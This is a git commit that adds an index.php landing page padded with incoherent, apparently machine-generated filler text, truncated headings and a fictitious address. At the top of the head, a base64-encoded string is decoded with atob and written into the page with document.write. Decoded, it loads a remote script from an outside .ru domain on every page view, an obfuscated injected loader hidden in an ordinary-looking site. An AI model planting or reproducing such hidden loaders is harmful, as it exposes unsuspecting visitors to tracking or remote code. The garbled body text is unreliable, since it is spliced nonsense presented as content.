35d631299b2ed17986c08e6bf28302e3da6eba03
iucvgssk <79536844+iucvgssk@users.noreply.github.com>
2021-02-23 20:10:39 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9xN3B5ejR4YzRudmdkeHRzYmQiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>The presence of a stable policy, authorities and legislation creates a fa</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+
+<body>
+
+	<header class="hk3bv03cctilx3c">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="x09a9nhvf5qojg3">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>The presence of a stable policy, authorities and legislation creates a fa</h1>
+	</section>
+
+
+	<section class="our-work" class="1rtm2n2kahbnk518akng">
+		<h3 class="title">And finally, Social Victory is a product of the Suf</h3>
+		<p>This is the principle of turn-taking: Personal Victory precedes Public Victory.  You know, I have one serious problem.  With the help of marginal costs, you can determine the minimum effective size of the enterprise; 8) distribution costs - costs associated with the delivery of products to the consumer.  Likewise, management follows leadership.  Monopoly can regulate production, but not demand.  Likewise, practicing all of the other skills prepares us for the skill of achieving synergy. </p>
+		<hr>
+
+		<ul class="grid" class="d7xy2zp9ogr1ngcdrpbm">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="hk3bv03cctilx3c">
+		<h3 class="title">But their true desire was to make money.  </h3>
+		<p>It makes a person accountable for doing his job and evaluating his results and provides consequences as a natural result of activities.  But if you can take the first steps on at least some of these things and thereby help others and yourself develop a Quadruple II mindset, then over time you will experience a significant increase in efficiency.And again, I admit that in a family or small business, such delegation of authority will be impossible.  MARKET PRICE.  This is especially useful when creating Personal Mission statements, since the two unique human gifts that enable us to use Habit 2 — imagination and conscience — are primarily functions of the right brain hemisphere.  He treated people like puppets who cannot have their own opinion.  Therefore, my friend adopted the "Win / Win or Do Not Contact" setting. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="x09a9nhvf5qojg3" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="1rtm2n2kahbnk518akng">
+		<h3 class="title">The conclusions obtained as a result of the research carried ou</h3>
+		<p>It can be called in different ways:balance of strength of personality and empathy, balance of self-confidence and respect for others, balance of caring for people and caring about completing the task "I'm okay - you're okay" in the language of transaction analysis - all the same, behind this there is a quality that I called balance courage and sensitivity.  From the standpoint of the reproductive approach applied to the “labor force” product, four main phases are distinguished: 1) formation.The phase of the formation of high-quality functional abilities for labor activity includes school, university, industrial training, advanced training, etc .; 2) distribution and exchange.  Independence is our most important achievement in ourselves.  At this price, he will buy 5 units.  They combine their efforts to solve the problem, study it together, analyze all the needs and work to create a third alternative that can satisfy these needs.  If we are emotionally unprotected, even having a high intelligence will not relieve us of a sense of serious threat when using Habits 4, 5, and 6 in dealing with people whose views on vital issues differ from ours.  During the next meeting with this person, listen to understand, and compare what you heard with what you recorded.  Let us turn again to the words of Frankl: "Ultimately, a person should not ask others what is the meaning of his life, but should realize that this question should be addressed to himself." In other words, life poses questions to a person that he can answer only by being responsible for his own life; a person can answer the questions of life only by being responsible.  If you wait for the influence on you from the outside, you will certainly find yourself under this influence.  everything! I don’t want to talk about it anymore! It is obvious that the father had good intentions.  And this is really very important.  Material goals are achieved through the implementation of actions (operations, processes, activities). </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="d7xy2zp9ogr1ngcdrpbm" style="background-image: url(image3.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="hk3bv03cctilx3c">
+		<h3 class="title">At the same time, internal reporting includes infor</h3>
+		<p>Change in average costs in the long run Long-term average costs and scale of production.  It empowers you to focus on your Circle of Influence in interdependent situations, the power to look at other people through the Sufficiency Mindset paradigm, and to truly appreciate their differences and celebrate their success.  If, in any range of output, long-term average costs increase with production volumes, then there is a damage.  Forms of legal entities: commercial organizations and non-profit organizations.  I will try to apply 7 Skills: I am sure that they are the key to increasing efficiency.  Your power lies somewhere between inaction, being a puppet that someone is pulling the strings, and a high degree of proactivity, the inner strength to act in accordance with your own values, instead of being subject to the influence of other people and circumstances.  You are responsible for everything.  I highly recommend starting by setting a goal to read one book a month, then two weeks, then a week.  The secondary market is intended for the circulation of previously issued securities.  Distinguish between individual and aggregate demand.  These thoughts took hold of my friend so much that it began to affect his relationships with family members, with the church, and with colleagues at work.  Name the price and we will put our signatures!Then strive to be understood.  It was easy to see that all the passengers of the carriage experienced the same irritation. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="x09a9nhvf5qojg3" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="1rtm2n2kahbnk518akng">
+		<h3 class="title">Figure: 2 shows how the choice is made und</h3>
+		<p>If one or more of the following descriptions apply to you, then you can identify the appropriate focus that may limit your personal effectiveness.  When you use the fourth stage of empathic listening, something incredible happens.  This rule applies to laws and other regulations,formulating the rights and obligations of state bodies, i.e.  He would continue to adhere to the Win / Win approach until a decision is made that suits both parties. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="d7xy2zp9ogr1ngcdrpbm" class="title">The centrally controlled system has deprived economic entities </h3>	
+		<p>2).  It focuses your efforts and energy.  Not a single step can be skipped.  In this case, costs represent the amount of payments that the entity has made to suppliers and its employees.  I am grateful to the thousands of mature and young people, parents and teachers, leaders of organizations and their other clients, who, after reading the materials of this book, shared their thoughts with me and inspired me to further work.  Perhaps in all future negotiations, I will invisibly bear my battle scars.My relationship to you and your company can become the property of other people with whom I have to communicate on business.  As we develop our self-awareness, many of us find ourselves in ineffective scenarios, deeply rooted unworthy habits that are incompatible withwhat we truly value in life.  The workshop is completely transformed by the joyful excitement of a new impulse of a new idea and a new direction, which are difficult to define, but almost tangible for all participants. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="hk3bv03cctilx3c">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="x09a9nhvf5qojg3"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="1rtm2n2kahbnk518akng"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="d7xy2zp9ogr1ngcdrpbm"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>540 Pollich Drives, Apt. 838, 85069-3395, D'Amorestad, Tennessee, United States</p>
+		<p>Phone number: +74(0192)179-81385</p>
+	</footer>
+
+</body>
+
+</html>
